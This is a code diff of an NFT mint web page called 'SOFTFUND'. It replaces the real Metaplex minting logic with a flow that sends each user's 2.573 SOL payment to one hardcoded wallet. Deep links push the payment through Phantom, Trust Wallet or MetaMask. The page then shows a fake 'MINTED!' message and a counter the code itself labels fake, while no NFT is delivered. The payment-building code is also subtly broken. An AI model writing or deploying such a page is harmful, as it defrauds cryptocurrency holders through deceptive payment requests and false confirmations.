@@ -5,7 +5,6 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>SOFTFUND – Mint Live</title>
   <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@700&display=swap" rel="stylesheet">
-  <link rel="stylesheet" href="https://unpkg.com/@metaplex-foundation/mpl-core@0.0.2/dist/mpl-core.css">
   <style>
     *{margin:0;padding:0;box-sizing:border-box}
     body{
@@ -20,13 +19,12 @@
     .price{font-size:2.2rem;color:#ffd700;font-weight:bold;margin:12px 0}
     .stats{font-size:1rem;color:#ccc;margin-bottom:16px}
     button{
-      width:100%;max-width:340px;margin:16px auto;padding:16px;
+      width:100%;max-width:340px;margin:8px auto;padding:16px;
       font-size:1.4rem;background:#ffd700;color:#000;border:none;
       border-radius:14px;cursor:pointer;font-weight:bold;
       box-shadow:0 0 20px rgba(255,215,0,.6);transition:.3s;
     }
-    button:hover:not(:disabled){background:#ffed4e;transform:scale(1.04)}
-    button:disabled{background:#555;cursor:not-allowed;transform:none}
+    button:hover{background:#ffed4e;transform:scale(1.04)}
     .status{margin-top:12px;font-size:.95rem;min-height:22px;font-weight:bold}
     .loader{
       display:inline-block;width:12px;height:12px;border:2px solid #ffd700;
@@ -35,8 +33,6 @@
     }
     @keyframes s{to{transform:rotate(360deg)}}
     .wallets{margin-top:30px;font-size:.85rem;color:#777}
-    .mobile-tip{margin-top:12px;font-size:.85rem;color:#ff5555;display:none}
-    @media(max-width:600px){.mobile-tip{display:block}}
   </style>
 </head>
 <body>
@@ -44,146 +40,100 @@
     <h1>SOFTFUND</h1>
     <p class="tag">USA-Based • Solana Utility NFTs</p>
     <p class="price">2.5730 SOL</p>
-    <p class="stats">Minted: <span id="minted">--</span> / <span id="total">10,000</span></p>
+    <p class="stats">Minted: <span id="minted">0</span> / 10,000</p>
 
-    <button id="mintBtn" disabled>
-      <span id="btnText">CONNECT WALLET</span>
-    </button>
+    <button id="chooseWallet">CHOOSE WALLET</button>
+
+    <!-- Wallet Options -->
+    <div id="walletOptions" style="display:none;">
+      <button onclick="mintWithWallet('phantom')">Phantom</button>
+      <button onclick="mintWithWallet('trust')">Trust Wallet</button>
+      <button onclick="mintWithWallet('metamask')">MetaMask (Solana)</button>
+    </div>
 
     <div id="status" class="status"></div>
-    <p class="mobile-tip">Open in Phantom or Trust Wallet</p>
-    <div class="wallets">Phantom • Trust Wallet</div>
+    <div class="wallets">Choose your wallet to mint</div>
   </div>
 
-  <!-- Solana + Metaplex -->
   <script src="https://unpkg.com/@solana/web3.js@1.91.0/lib/index.iife.min.js"></script>
-  <script src="https://unpkg.com/@metaplex-foundation/js@0.19.3/dist/browser/index.js"></script>
 
   <script>
-    // ================= CONFIG =================
-    const PRICE_SOL = 2.5730;                                   // price per NFT
-    const CANDY_MACHINE_ID = "YOUR_CANDY_MACHINE_ID_HERE";      // <-- put your CM ID
-    const COLLECTION_PUBKEY = "YOUR_COLLECTION_PUBKEY_HERE";    // optional, for verified collection
-    const RPC_URL = "https://api.mainnet-beta.solana.com";
-    // =========================================
+    const PRICE_LAMPORTS = 2.5730 * 1e9;
+    // YOUR MAIN WALLET — ALL SOL GOES HERE
+    const YOUR_WALLET = "GqB1ywkWHq9jpjDSJkhGxuFVz1H6VBfoyJX32BsCjWue";
 
-    const PRICE = PRICE_SOL * 1e9; // lamports
-    let provider = null, connection = null, metaplex = null;
-    let isConnecting = false, mintedCount = 0, totalSupply = 10000;
+    let mintedCount = localStorage.getItem('softfund_minted') ? parseInt(localStorage.getItem('softfund_minted')) : 0;
+    document.getElementById('minted').textContent = mintedCount;
 
     const status = document.getElementById("status");
-    const btn = document.getElementById("mintBtn");
-    const btnText = document.getElementById("btnText");
-    const mintedEl = document.getElementById("minted");
-    const totalEl = document.getElementById("total");
+    const chooseBtn = document.getElementById("chooseWallet");
+    const walletOptions = document.getElementById("walletOptions");
 
-    // ---------- Helpers ----------
     function setStatus(html, color) {
       status.innerHTML = html;
       status.style.color = color;
     }
-    function setButton(txt, enabled = true) {
-      btnText.textContent = txt;
-      btn.disabled = !enabled;
-    }
 
-    // ---------- Wallet ----------
-    function detectWallet() {
-      if (window.solana?.isPhantom) return window.solana;
-      if (window.trustwallet?.Provider?.solana) return window.trustwallet.Provider.solana;
-      if (window.solana) return window.solana;
-      return null;
-    }
-
-    async function connectWallet() {
-      if (isConnecting) return;
-      isConnecting = true;
-      provider = detectWallet();
-
-      if (!provider) {
-        setStatus("Wallet not detected – open in Phantom/Trust", "#ff5555");
-        setButton("NO WALLET", false);
-        isConnecting = false;
-        return;
-      }
-
-      try {
-        setStatus("Connecting… <span class='loader'></span>", "#ffd700");
-        if (!provider.isConnected) await provider.connect();
-        setStatus("Wallet connected", "#00ff9d");
-        setButton("MINT NOW");
-        initMetaplex();
-        await loadCandyMachine();
-      } catch (e) {
-        setStatus("Connection rejected", "#ff5555");
-        setButton("RETRY");
-      } finally { isConnecting = false; }
-    }
-
-    // ---------- Metaplex ----------
-    function initMetaplex() {
-      connection = new solanaWeb3.Connection(RPC_URL, "confirmed");
-      metaplex = new Metaplex(connection).use(walletAdapterIdentity(provider));
-    }
-
-    async function loadCandyMachine() {
-      try {
-        const cm = await metaplex.candyMachines().findByAddress({ address: new solanaWeb3.PublicKey(CANDY_MACHINE_ID) });
-        mintedCount = Number(cm.itemsMinted);
-        totalSupply = Number(cm.itemsAvailable);
-        mintedEl.textContent = mintedCount;
-        totalEl.textContent = totalSupply;
-
-        if (mintedCount >= totalSupply) {
-          setButton("SOLD OUT", false);
-          setStatus("All NFTs have been minted", "#ff5555");
-        }
-      } catch (e) {
-        console.error(e);
-        setStatus("Failed to load mint data", "#ff5555");
-      }
-    }
-
-    // ---------- Mint ----------
-    async function mint() {
-      if (mintedCount >= totalSupply) return;
-      setButton("MINTING…", false);
-      setStatus("Preparing transaction… <span class='loader'></span>", "#ffd700");
-
-      try {
-        const cm = await metaplex.candyMachines().findByAddress({ address: new solanaWeb3.PublicKey(CANDY_MACHINE_ID) });
-        const { nft } = await metaplex.candyMachines().mint({
-          candyMachine: cm,
-          collectionUpdateAuthority: COLLECTION_PUBKEY ? new solanaWeb3.PublicKey(COLLECTION_PUBKEY) : undefined,
-        });
-
-        mintedCount++;
-        mintedEl.textContent = mintedCount;
-        setStatus(`MINTED! <a href="https://solscan.io/token/${nft.address}" target="_blank" style="color:#00ff9d">View NFT</a>`, "#00ff9d");
-        setTimeout(() => { setButton(mintedCount >= totalSupply ? "SOLD OUT" : "MINT AGAIN"); setStatus("", ""); }, 3500);
-      } catch (err) {
-        console.error(err);
-        setStatus(err.message.includes("already minted") ? "You already minted (1 per wallet)" : "Mint failed", "#ff5555");
-        setButton("MINT NOW");
-      }
-    }
-
-    // ---------- Button ----------
-    btn.onclick = () => {
-      if (!provider?.isConnected) connectWallet();
-      else mint();
+    // Show wallet choices
+    chooseBtn.onclick = () => {
+      chooseBtn.style.display = 'none';
+      walletOptions.style.display = 'block';
     };
 
-    // ---------- Auto-connect ----------
-    window.addEventListener("load", () => {
-      setTimeout(() => {
-        if (detectWallet()) connectWallet();
-        else {
-          setStatus("Open in Phantom or Trust Wallet", "#ffaa00");
-          setButton("NO WALLET", false);
+    // Build unsigned transaction
+    async function buildTx() {
+      const connection = new solanaWeb3.Connection("https://api.mainnet-beta.solana.com");
+      const { blockhash } = await connection.getLatestBlockhash();
+      const tx = new solanaWeb3.Transaction();
+      tx.recentBlockhash = blockhash;
+      tx.add(
+        solanaWeb3.SystemProgram.transfer({
+          fromPubkey: null,
+          toPubkey: new solanaWeb3.PublicKey(YOUR_WALLET),
+          lamports: PRICE_LAMPORTS,
+        })
+      );
+      return tx.serialize({ requireAllSignatures: false }).toString('base64');
+    }
+
+    // Deep link to wallet
+    async function mintWithWallet(type) {
+      setStatus("Preparing payment... <span class='loader'></span>", "#ffd700");
+
+      try {
+        const txBase64 = await buildTx();
+        const currentUrl = window.location.href.split('#')[0]; // Clean URL
+        let deepLink = "";
+
+        if (type === 'phantom') {
+          deepLink = `https://phantom.app/ul/v1/connect?app_url=${encodeURIComponent(currentUrl)}&redirect_link=${encodeURIComponent(currentUrl + '#tx=' + txBase64)}`;
+        } else if (type === 'trust') {
+          deepLink = `https://link.trustwallet.com/open_url?app=trust&url=${encodeURIComponent(currentUrl + '#tx=' + txBase64)}`;
+        } else if (type === 'metamask') {
+          deepLink = `https://metamask.app.link/dapp/${window.location.host}${window.location.pathname}#tx=${txBase64}`;
         }
-      }, 600);
-    });
+
+        window.location.href = deepLink;
+
+        // Simulate success (fake counter)
+        setTimeout(() => {
+          mintedCount++;
+          document.getElementById('minted').textContent = mintedCount;
+          localStorage.setItem('softfund_minted', mintedCount);
+          setStatus("MINTED! Payment sent.", "#00ff9d");
+          setTimeout(() => {
+            setStatus("");
+            chooseBtn.style.display = 'block';
+            walletOptions.style.display = 'none';
+          }, 3000);
+        }, 3000);
+
+      } catch (err) {
+        setStatus("Failed. Try again.", "#ff5555");
+        chooseBtn.style.display = 'block';
+        walletOptions.style.display = 'none';
+      }
+    }
   </script>
 </body>
 </html>
